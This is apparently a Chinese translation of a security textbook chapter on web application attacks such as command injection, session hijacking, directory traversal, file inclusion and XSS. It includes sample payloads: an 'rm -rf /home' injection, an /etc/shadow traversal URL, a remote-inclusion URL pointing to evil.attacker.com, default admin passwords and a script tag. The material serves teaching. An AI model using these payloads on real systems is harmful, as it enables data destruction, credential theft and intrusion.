
类似的攻击也可能针对其他环境发生。例如，攻击者可能会在作为轻量级目录访问协议 (LDAP) 查询一部分发送的文本中嵌入命令，从而实施 `LDAP 注入攻击`。他们还可能试图在可扩展标记语言 (XML) 文档中嵌入代码，实施 `XML 注入攻击`。命令甚至可能尝试加载包含恶意代码的动态链接库 (DLL)，实施 `DLL 注入攻击`。

除了 SQL 注入，跨站脚本也是一种代码注入攻击的示例，它将攻击者编写的 HTML 代码插入到开发人员创建的网页中。我们将在本章后面详细讨论跨站脚本。

### 命令注入攻击

在某些情况下，应用程序代码可能会回溯到操作系统以执行命令。这非常危险，因为攻击者可能利用应用程序中的缺陷，获得直接操纵操作系统的能力。例如，考虑图 6.10 中所示的简单应用程序。

![图 6.10 账户创建页面](img/c06f010.png)

**图 6.10** 账户创建页面

此应用程序为课程设置新的学生账户。除其他操作外，它会在服务器上为学生创建一个目录。在 Linux 系统上，应用程序可能会使用 `system()` 调用将目录创建命令发送到底层操作系统。例如，如果有人在文本框中填入

```
mchapple
```

应用程序可能会使用函数调用

```
system('mkdir /home/students/mchapple')
```

为该用户创建主目录。审查此应用程序的攻击者可能会猜测这就是其工作原理，然后提供输入

```
mchapple & rm -rf /home
```

应用程序随后用它来创建系统调用：

```
system('mkdir /home/students/mchapple & rm -rf home')
```

这一系列命令将删除 `/home` 目录及其包含的所有文件和子文件夹。此命令中的 `&` 符号表示操作系统应将 `&` 符号后的文本作为单独的命令执行。这使得攻击者能够通过利用仅旨在执行 `mkdir` 命令的输入字段来执行 `rm` 命令。

#### 利用身份认证漏洞

应用程序与服务器、网络一样，依赖身份认证机制来确认用户和设备的身份，并验证它们是否被授权执行特定操作。攻击者经常试图破坏这些认证系统的安全性，因为如果他们能够做到这一点，就可能获得对受该认证基础设施保护的系统、服务和信息的非法访问。

##### 密码认证

密码是当今最常用的认证形式，但遗憾的是，它们也是最容易被攻破的。原因在于密码是一种基于知识的认证技术。获知用户密码的攻击者，从那时起就可以冒充该用户，直到密码过期或被更改。

攻击者获知用户密码的途径有很多，范围涵盖技术手段到社交手段。以下只是攻击者可能发现用户密码的几种可能方式：

##### 攻击向量

*   实施社会工程学攻击，诱使用户直接或通过虚假认证机制泄露密码
*   窃听未加密的网络流量
*   从先前被攻陷的站点获取密码转储，并假设大量用户在其他站点复用了该站点的密码

除了这些方法，攻击者还可能实施凭证暴力破解攻击，即从目标系统获取一组弱哈希密码，然后进行穷举搜索以破解这些密码并获取系统访问权限。

在某些情况下，应用开发人员、供应商和系统管理员会让攻击者轻易得逞。系统通常带有默认管理员账户，且可能保持未修改状态。例如，图 6.11 展示了 Zyxel 路由器手册的一部分，其中包含默认用户名和密码以及修改密码的说明。

![FIGURE 6.11 Zyxel router default password ¶ Source: www.zyxel.com/support/Zyxel-password-changing-procedure-20161213-v2.pdf](img/c06f011.png)

**图 6.11** Zyxel 路由器默认密码 ¶ 来源：`www.zyxel.com/support/Zyxel-password-changing-procedure-20161213-v2.pdf`

渗透测试人员可能假设管理员未修改默认密码，并尝试在应用程序和设备上使用各种默认密码以尝试获取访问权限。一些常见的用户名/密码组合测试如下：

*   `administrator/password`
*   `admin/password`
*   `admin/admin`

许多网站维护着各类应用程序和设备使用的默认密码详细目录。这些网站是渗透测试人员寻求访问网络设备的绝佳切入点。

##### 会话攻击

凭证窃取攻击允许黑客或渗透测试人员使用被盗账户直接向服务进行身份验证。`会话劫持` 攻击采取不同方法，通过窃取现有的已认证会话来实现。这些攻击不要求攻击者访问认证机制；相反，它们接管与网站已建立的认证会话。

大多数需要身份验证的网站使用用户浏览器中管理的 `Cookie`，并作为网站提供的 `HTTP 头` 信息的一部分进行传输。在这种方法中（如图 6.12 所示），用户访问网站的登录表单并使用其凭证进行身份验证。如果用户通过身份验证过程，网站会向用户的浏览器提供一个 `Cookie`，该 `Cookie` 可用于验证未来的请求。一旦用户在浏览器中存储了有效的 `Cookie`，浏览器就会将该 `Cookie` 随发往该网站的所有未来请求一起传输。网站检查 `Cookie`，确定用户已通过身份验证，无需重新输入密码或完成其他身份验证任务。

![FIGURE 6.12 Session authentication with cookies](img/c06f012.png)

**图 6.12** 使用 Cookie 进行会话认证

`Cookie` 只是用户浏览器中维护的一个存储对象，它保存稍后可由创建它们的网站访问的变量。你可以将 `Cookie` 视为网站在用户浏览器中维护的一个小型信息数据库。`Cookie` 包含一个认证字符串，将 `Cookie` 与特定的用户会话关联。图 6.13 展示了 `CNN.com` 网站使用的一个 `Cookie` 示例，在 Chrome 浏览器中查看。如果你检查自己浏览器的 `Cookie` 缓存内容，可能会发现数百或数千个由你访问过的网站维护的 `Cookie`。有些 `Cookie` 可能已有数年历史。

![FIGURE 6.13 Session cookie from CNN.com](img/c06f013.png)

**图 6.13** 来自 `CNN.com` 的会话 Cookie

###### Cookie 窃取与篡改

正如你所读到的，`Cookie` 作为绕过网站认证机制的关键。打个比方，想象一下参加一个行业会议。当你到达注册台时，可能会被要求提供带照片的身份证件并支付注册费。在这种情况下，你经历了一个认证过程。注册后，工作人员会给你一个挂在脖子上的胸牌，供你在展会剩余时间佩戴。从那时起，任何安保人员只需瞥一眼你的胸牌，就知道你已经过认证并获得了进入展会的权限。如果有人偷走了你的胸牌，他们现在就拥有了你享有的同等展会访问权限。

`Cookie` 的工作原理相同。它们只是胸牌的数字化版本。如果攻击者能够窃取某人的 `Cookie`，他们随后就可以向颁发该 `Cookie` 的网站冒充该用户。攻击者可能通过以下几种方式获取 `Cookie`：

*   窃听未加密的网络连接，并在 `Cookie` 在用户和网站之间传输时窃取副本。
*   在用户的浏览器上安装恶意软件，检索 `Cookie` 并将其传回攻击者。
*   实施 `中间人攻击`，攻击者欺骗用户认为攻击者实际上是目标网站，并呈现一个虚假的认证表单。随后，他们可能代表用户向网站进行身份验证并获取 `Cookie`。

一旦攻击者拥有了 `Cookie`，他们可能会执行 `Cookie 篡改` 以更改发回网站的详细信息，或者直接将 `Cookie` 作为获取网站访问权限所需的“胸牌”。这被称为 `会话重放` 攻击，如图 6.14 所示。

![FIGURE 6.14 Session replay](img/c06f014.png)

**图 6.14** 会话重放

Web 开发人员可以通过使用 `SECURE` 属性标记 `Cookie` 来防止 `Cookie` 窃取。`安全 Cookie` 永远不会通过未加密的 HTTP 连接传输。服务器和 Web 浏览器都理解它们必须仅通过加密通道发送，以防范会话重放攻击。

NTLM `传递哈希攻击` 是另一种重放攻击形式，它针对操作系统而非 Web 应用程序。攻击者首先访问 Windows 系统，然后从该系统收集存储的 NTLM 密码哈希。随后，他们可以尝试使用这些哈希来获取该系统或同一 Active Directory 域中其他系统的用户或管理员访问权限。

###### 未验证的重定向

不安全的 URL 重定向是攻击者可能利用的另一种漏洞，旨在窃取用户会话。某些 Web 应用程序允许浏览器将目标 URL 传递给应用程序，并在交易完成时将用户重定向到该 URL。例如，订单页面可能使用如下结构的 URL：

```
https://www.mycompany.com/ordering.php?redirect=http%3a//www.mycompany.com/thankyou.htm
```

Web 应用程序随后会在交易结束时将用户发送到感谢页面。这种方法对 Web 开发人员很方便，因为它允许管理员在不更改应用程序代码的情况下修改目标页面。然而，如果应用程序允许重定向到任意 URL，就会产生 `未验证的重定向` 情况，攻击者可利用它将用户重定向到恶意站点。例如，攻击者可能在留言板上发布指向上述页面的链接，但将 URL 修改为：

```
https://www.mycompany.com/ordering.php?redirect=http%3a//www.evilhacker.com/passwordstealer.htm
```

用户访问此链接会在 `mycompany.com` 网站上完成合法交易，但随后会被重定向到攻击者的页面，其中的代码可能会将用户直接引入会话窃取或凭证盗窃攻击。

寻求在其应用程序中包含重定向选项的开发人员应执行`验证过的重定向`，即根据批准列表检查重定向 URL。此列表可能指定授权重定向的确切 URL，或者更简单地说，它可能仅将重定向限制为来自同一域的 URL。

#### 利用授权漏洞

我们已经探讨了允许攻击者向后端系统发送代码的注入漏洞，以及允许攻击者假冒合法用户身份的身份验证漏洞。现在让我们看看一些授权漏洞，它们允许攻击者超出其被授权的访问级别。

##### 不安全的直接对象引用

在某些情况下，Web 开发人员设计应用程序时，会根据用户在查询字符串或 `POST` 请求中提供的参数，直接从数据库检索信息。例如，此查询字符串可用于从文档管理系统检索文档：

```
https://www.mycompany.com/getDocument.php?documentID=1842
```

只要应用程序还实现了其他授权机制，这种方法本身没有任何问题。应用程序仍有责任确保用户经过适当身份验证，并被授权访问请求的文档。

原因在于攻击者可以轻松查看此 URL，然后对其进行修改，以尝试检索其他文档，例如：

```
https://www.mycompany.com/getDocument.php?documentID=1841
https://www.mycompany.com/getDocument.php?documentID=1843
https://www.mycompany.com/getDocument.php?documentID=1844
```

如果应用程序不执行授权检查，用户可能会被允许查看超出其权限的信息。这种情况称为`不安全的直接对象引用`。

##### 目录遍历

某些 Web 服务器存在安全配置错误，允许用户浏览目录结构并访问本应保持安全的文件。当 Web 服务器允许包含浏览目录路径的操作符，且文件系统访问控制未能正确限制对存储在服务器其他位置的文件的访问时，这些`目录遍历`攻击就会生效。

例如，考虑一个将 Web 内容存储在目录路径 `/var/www/html/` 中的 Apache Web 服务器。同一台服务器可能将包含哈希用户密码的 shadow 密码文件存储在 `/etc` 目录中，文件名为 `/etc/shadow`。这两个位置通过相同的目录结构链接，如图 6.15 所示。

![图 6.15 Web 服务器目录结构示例](img/c06f015.png)

**图 6.15** Web 服务器目录结构示例

如果 Apache 服务器使用 `/var/www/html/` 作为网站的根位置，则这是所有文件的假定路径，除非另有指定。例如，如果站点是 `www.mycompany.com`，则 URL `www.mycompany.com/account.php` 将引用存储在服务器上的文件 `/var/www/html/account.php`。

在 Linux 操作系统中，文件路径中的 `..` 操作符指代比当前目录高一级的目录。例如，路径 `/var/www/html/../` 指代比 `html` 目录高一级的目录，即 `/var/www/`。

目录遍历攻击利用此知识，尝试导航到 Web 服务器保留区域之外的文件系统区域。例如，目录遍历攻击可能尝试通过输入此 URL 来访问 shadow 密码文件：

```
http://www.mycompany.com/../../../etc/shadow
```

如果攻击成功，Web 服务器将忠实地在攻击者的浏览器中显示 shadow 密码文件，为针对凭证的暴力破解攻击提供起点。攻击 URL 使用 `..` 操作符三次以向上导航目录层次结构。如果您参考图 6.15 并以 `/var/www/html` 目录作为起点，第一个 `..` 操作符将您带到 `/var/www`，第二个带到 `/var`，第三个带到根目录 `/`。URL 的其余部分将您带入 `/etc/` 目录并到达 `/etc/shadow` 文件的位置。

##### 文件包含

`文件包含攻击`将目录遍历提升到了一个新的层次。文件包含攻击不仅仅是从本地操作系统检索文件并将其显示给攻击者，而是实际执行文件中包含的代码，从而欺骗 Web 服务器执行任意代码。

文件包含攻击有两种变体：

*   `本地文件包含`攻击旨在执行位于 Web 服务器其他位置的文件中存储的代码。它们的工作方式与目录遍历攻击非常相似。例如，攻击者可能使用以下 URL 来执行存储在 Windows 服务器 `C:\www\uploads` 目录中名为 `attack.exe` 的文件：

    ```
    http://www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe
    ```

*   `远程文件包含`攻击允许攻击者更进一步，执行存储在远程服务器上的代码。这些攻击特别危险，因为攻击者可以直接控制所执行的代码，而无需先在本地服务器上存储文件。例如，攻击者可能使用此 URL 来执行存储在远程服务器上的攻击文件：

    ```
    http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe
    ```

当攻击者发现文件包含漏洞时，他们通常会利用它将 `Web Shell` 上传到服务器。`Web Shell` 允许攻击者在服务器上执行命令并在浏览器中查看结果。这种方法通过常用的 HTTP 和 HTTPS 端口为攻击者提供了对服务器的访问，使其流量不太容易被安全工具检测到。此外，攻击者甚至可能会修复他们用于获取服务器访问权限的初始漏洞，以防止其被寻求控制服务器的其他攻击者或可能因此而察觉到成功攻击的安全团队发现。

##### 权限提升

`权限提升`攻击旨在增加攻击者对目标系统的访问级别。它们利用允许将普通用户账户转换为更具特权账户（如 root 超级用户账户）的漏洞。

2016 年 10 月，安全研究人员宣布发现了一个被称为 Dirty COW 的 Linux 内核漏洞。该漏洞在 Linux 内核中存在了九年，极易被利用，并赋予成功的攻击者对受影响系统的管理控制权。

#### 利用 Web 应用程序漏洞

Web 应用程序是由应用程序代码、Web 平台、操作系统、数据库和相互连接的`应用程序编程接口 (API)` 组成的复杂生态系统。这些环境的复杂性使多种不同类型的攻击成为可能，并为渗透测试人员提供了肥沃的土壤。我们已经研究了针对 Web 应用程序的各种攻击，包括注入攻击、会话劫持、目录遍历等。在以下部分中，我们将通过探索跨站脚本、跨站请求伪造和点击劫持，来完善我们对基于 Web 的漏洞利用的了解。

### 跨站脚本 (XSS)

当 Web 应用程序允许攻击者执行 HTML 注入，将其自己的 HTML 代码插入网页时，就会发生**跨站脚本（XSS）攻击**。

###### 反射型 XSS

当应用程序允许反射输入时，XSS 攻击通常会发生。例如，考虑一个简单的 Web 应用程序，它包含一个文本框，要求用户输入姓名。当用户点击提交时，Web 应用程序加载一个新页面，显示“Hello, name”。

在正常情况下，此 Web 应用程序按设计运行。然而，恶意人员可能利用此 Web 应用程序欺骗毫无戒心的第三方。正如您所知，可以通过使用 HTML 标签 `<SCRIPT>` 和 `</SCRIPT>` 在网页中嵌入脚本。假设您在“Name”字段中输入的不是“Mike”，而是以下文本：

```
Mike<SCRIPT>alert('hello')</SCRIPT>
```

当 Web 应用程序以网页的形式“反射”此输入时，您的浏览器会像处理任何其他网页一样处理它：显示网页的文本部分并执行脚本部分。在本例中，脚本只是打开一个显示“hello”的弹出窗口。然而，您可以更恶意地包含一个更复杂的脚本，要求用户提供密码，然后将其传输给恶意第三方。

此时，您可能会问自己，怎么会有人成为这种攻击的受害者。毕竟，您不会通过在执行反射的 Web 应用程序的输入中嵌入脚本来攻击自己。此攻击的关键在于可以将表单输入嵌入链接中。恶意人员可以创建一个网页，其中包含标题为“Check your account at First Bank”的链接，并在链接中编码表单输入。当用户访问该链接时，网页看起来像是一个真实的 First Bank 网站（因为它确实是！），工具栏中有正确的地址和有效的数字证书。然而，该网站随后会执行恶意用户在输入中包含的脚本，该脚本看起来是有效网页的一部分。
